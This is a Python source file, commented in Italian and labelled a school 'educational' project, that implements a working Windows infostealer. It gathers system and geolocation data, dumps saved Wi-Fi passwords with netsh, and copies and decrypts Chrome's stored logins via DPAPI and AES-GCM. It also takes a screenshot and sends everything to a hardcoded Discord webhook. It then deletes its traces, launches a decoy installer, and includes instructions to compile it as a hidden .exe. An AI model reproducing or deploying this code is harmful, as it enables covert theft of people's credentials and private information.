"""Programma creato a scopo didattico, non farne uso per nessun motivo personale."""

"""
La velocità del programma è basta sulla velocità della CPU del PC attaccato.
è consigliato eseguire il programma da chiavetta per evitare eventuali errori legati ai nomi delle cartelle presenti sul PC della vittima.

COMANDO PER LA COMPILAZIONE IN .EXE (il file verrà salvato in una cartella chiamata "dist") :
pyinstaller --onefile --noconsole ProgettoEducazioneCivica.py

Authors: 
- Di Mantua Daniele
- Becchio Alexander
"""

import os, subprocess, requests, sys
import browser_cookie3 as steal, requests, base64, random, string, zipfile, os, shutil, dhooks, re, sys, sqlite3
from dhooks import Webhook, Embed, File
from PIL import ImageGrab as Image
import json
import socket
from uuid import getnode as get_mac
from requests import get
import psutil
import platform
from subprocess import Popen, PIPE
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES


# Url del webhook
url= "https://discord.com/api/webhooks/1181277872317542410/yvqysenZoh6EsbKaH0eGZ-3hZEf55K0EvKlp5i0oLpZlFHCRF_KLWPFkTxoGKPJDptI7"
hook = Webhook(url)

no_zip = False # nel caso non riesca ad inviare le informazioni online questa variabile le salva in locale

powershell = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
car = '"'
l_acconsentita = ["WPA2-Personal", "WPA3-Personal", "WPA", "WPA2", "WPA3"]

# prendo il percorso assoluto del file fino all'ultima cartella
for cartella, _, _ in os.walk(os.getcwd()):
    percorsoTemp = cartella
root = percorsoTemp.split(":")[0]
    
cpufreq = psutil.cpu_freq() # Frequenza CPU
uname = platform.uname()
try:
    mac = str(hex(get_mac()))[2:].upper() # prende il mac
    host = socket.gethostname() # nome del PC
    localip = socket.gethostbyname(host) # IP del pc
    publicip = get('http://api.ipify.org').text # IP pubblico del pc
    city = get(f'http://ipapi.co/{publicip}/city').text # Citta
    country = get(f'http://ipapi.co/{publicip}/country_name').text
    region = get(f'http://ipapi.co/{publicip}/region').text # Paese
    provider = get(f'http://ipapi.co/{publicip}/org').text
    vpn = requests.get('http://ip-api.com/json?fields=proxy')
    proxy = vpn.json()['proxy'] # vede se si ha un vpn attivo sul pc
except: mac, host, localip, publicip, city, country, region, vpn, proxy, provider = "None","None","None","None","None","None","None","None","None","None"
""" fine inizializzazione variabili """

# Invia le informazioni del pc
def inviaInformazioni():
    requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Informazioni acquisite da: {host}", "color": 16711680 }, { "color": 7506394, "fields": [ { "name": "Geolocalizzazione", "value": f"\nIP privato: {localip} | VPN: {proxy}\nIP pubblico: {publicip}\nProvider: {provider}\nIndirizzo MAC: {mac}\n\nPaese: {country}\nRegione: {region}\nCittà: {city}\n\n" } ] }, { "fields": [ { "name": "Informazioni di sistema", "value": f"Sistema operativo: {uname.system}\nNome: {uname.node}\nMachine: {uname.machine}\nProcessore: {uname.processor}\n" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nFrequenza Max: {cpufreq.max:.2f}Mhz\nFrequenza Min: {cpufreq.min:.2f}Mhz\n"}]}]}), headers={"Content-Type": "application/json"})

# Prende i nomi delle reti Wi-Fi salvate sul pc
def prendiNomi(per):
    file = open(f"{per}\prendiNomi.bat", "w", encoding="utf-8")
    file.write(f"@echo off\nnetsh wlan show profiles|findstr /C:{car}Tutti i profili utente{car} > {car}{per}\WiFinomi.txt{car}")
    file.close()
    subprocess.run(f"{car}{per}\prendiNomi.bat{car}", shell=True)

# Converte in lista un file contenente le informazioni dopo i ":"
def creaLista(nome, per):
    file = open(f"{per}\{nome}", "r")
    s = file.readlines()
    l = [a.split(":")[-1][1:-1] for a in s]
    file.close()
    return l

# Crea un file batch che prende il tipo di autenticazione di ogni rete Wi-Fi salvata
def prendiAutenticazione(per,l):
    file = open(f"{per}\Autenticazioni.txt", "w", encoding="utf-8")
    for a in l:
        b = subprocess.run([powershell, f"(netsh wlan show profiles | netsh wlan show profile name={car}{a}{car} key=clear | findstr /C:{car}Autenticazione{car} | Select-Object -First 1)"], shell = True, capture_output=True, text=True).stdout[:-1]
        file.write(f"{b}\n")
    file.close()

# Crea un file batch che prende le password di ogni rete Wi-Fi salvata
def prendiPassword(l, per):
    file = open(f"{per}\prendiPassword.bat", "w", encoding="utf-8")
    file.write("@echo off\n")
    for a in l:
        file.write(f"netsh wlan show profiles|netsh wlan show profile name = {car}{a}{car} key = clear|findstr /C:{car}Contenuto chiave{car} >> {car}{per}\passwordWiFi.txt{car}\n")
    file.close()
    subprocess.run(f"{car}{per}\prendiPassword.bat{car}", shell=True)

# Crea il file che contiene il nome della rete e la sua rispettiva password
def filePassword(psw, nome, per):
    file = open(f"{per}\WiFiPassword.txt", "w", encoding="utf-8")
    for a,b in zip(nome, psw):
        file.write(f"-----------------\nNome: {a}\nPassword: {b}\n-----------------\n\n")
    file.close()

# copia il file dove è contenuto il dizionario con i siti a cui si è fatto accesso in passato
def prendiFileChrome(per):
    comando = rf"{car}$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data{car}"
    comando2 = rf"{car}$env:LOCALAPPDATA\Google\Chrome\User Data\Local State{car}"
    a = subprocess.run([powershell, comando], shell = True, capture_output=True, text=True).stdout[:-1]
    b = subprocess.run([powershell, comando2], shell = True, capture_output=True, text=True).stdout[:-1]

    file = open(f"{per}\CopiaFile.bat","w")
    file.write(f"@echo off\ncopy {car}{a}{car} {car}{per}\{car}\n")
    file.write(f"copy {car}{b}{car} {car}{per}\{car}\ncls")
    file.close()
    subprocess.run(f"{per}\CopiaFile.bat", shell = True)

# Crea il file con all'interno il link del sito e l'username della persona
def creaFileLink(per):
    file = open(f"{per}\SitiLogin.txt", "w", encoding="utf-8")
    conn = sqlite3.connect(f"{per}\Login Data")
    cur = conn.cursor()
    cur.execute("SELECT signon_realm,username_value,password_value FROM logins")
    rows = cur.fetchall()
    for row in rows:
        host = row[0]
        if host.startswith('android'):
                continue
        name = row[1]
        psw = cdecrypt(row[2], per)
        file.write(f"-----------------\nSito: {host}\nNome utente: {name}\nPassword: {psw}\n-----------------\n\n")
    file.close()
    conn.close()

#Decripta la password contenuta nel database
def cdecrypt(encrypted_txt, per):
    if sys.platform == 'win32':
        try:
            if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                decrypted_txt = dpapi(encrypted_txt)
                return decrypted_txt.decode()
            elif encrypted_txt[:3] == b'v10':
                decrypted_txt = decryptions(encrypted_txt, per)
                return decrypted_txt[:-16].decode()
        except WindowsError:
            return None
    else:
        pass

def dpapi(encrypted):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def decryptions(encrypted_txt, per):
    encoded_key = localdata(per)
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = rcipher(key)
    return decrypt(cipher, encrypted_txt[15:], nonce)

# restituisce la chiave crittografata associata alla crittografia dei dati dell'utente del browser Chrome
def localdata(per):
    jsn = None
    with open(rf"{per}\Local State", encoding='utf-8', mode="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def rcipher(key):
    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
    return cipher

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

# cattura uno screenshot
def screenShoot(per):
    try:
        screenshot = Image.grab()
        screenshot.save(f'{per}\screenshot.jpg')
        screenshot = open(f'{per}screenshot.jpg', 'rb')
        screenshot.close()
    except:
        pass

#Crea la zip da inviare su Discord
def creaZip(per):
    try:
        if no_zip == False:
            zname = f'{per}\Infromazioni-{host}.zip'
            newzip = zipfile.ZipFile(zname, 'w')
            try:
                newzip.write(f'{per}\WiFiPassword.txt')
                newzip.write(f'{per}\screenshot.jpg')
                newzip.write(f'{per}\SitiLogin.txt')
            except: pass
            newzip.close()
            wifipasswords = File(f'{per}\Infromazioni-{host}.zip')
        return wifipasswords
    except:
        pass



# MAIN
def main():
    # prendo il percorso assoluto del file fino all'ultima cartella
    for cartella, _, _ in os.walk(os.getcwd()):
        percorso = cartella

    try:
        prendiNomi(percorso)

        l_nomi = creaLista("WiFinomi.txt", percorso)

        # prendo e controllo il tipo di autenticazione della password del wi-fi
        prendiAutenticazione(percorso, l_nomi)
        l_autenticazioni_temp = creaLista("Autenticazioni.txt", percorso)

        l_autenticazioni = [a for a in l_autenticazioni_temp if a != '']
        for a in l_autenticazioni:
            if a not in l_acconsentita:
                l_nomi.remove(l_nomi[l_autenticazioni.index(a)])
                l_autenticazioni.remove(a)

        # prendo la password e le salvo nel file
        prendiPassword(l_nomi, percorso)
        l_password = creaLista("passwordWiFi.txt", percorso)
        filePassword(l_password, l_nomi, percorso)
    except: pass
    
    # provo a prendere le informazioni di chrome
    try:
        prendiFileChrome(percorso)
        creaFileLink(percorso)
    except: pass
    # scatta uno screenshot
    screenShoot(percorso)

    # zippa i file che voglio inviare
    wifipasswords = creaZip(percorso)

    # invia la zip
    try:
        hook.send(file=wifipasswords)
        subprocess.os.remove(f"{percorso}\Infromazioni-{host}.zip")
        subprocess.os.remove(f"{percorso}\WiFiPassword.txt")
        subprocess.os.remove(f"{percorso}\SitiLogin.txt")
    except:
        pass

    # Elimina tutti i file che non devono essere visibili all'utente
    try:
        subprocess.os.remove(f"{percorso}\prendiNomi.bat")
        subprocess.os.remove(f"{percorso}\WiFinomi.txt")
        subprocess.os.remove(f"{percorso}\Autenticazioni.txt")
        subprocess.os.remove(f"{percorso}\prendiPassword.bat")
        subprocess.os.remove(f"{percorso}\passwordWiFi.txt")
        subprocess.os.remove(f"{percorso}\CopiaFile.bat")
        subprocess.os.remove(f"{percorso}\Login Data")
        subprocess.os.remove(f"{percorso}\Local State")
        subprocess.os.remove(f"{percorso}\screenshot.jpg")
    except: pass

if __name__ == "__main__":

    #prova ad avviare il programma altrimenti continua l'esecuzione del malware.
    try:
        os.startfile(f"{root}:\\guportable\Installer.exe")
    except:
        pass
 
    try:
        inviaInformazioni()
    except:
        no_zip = True
    main()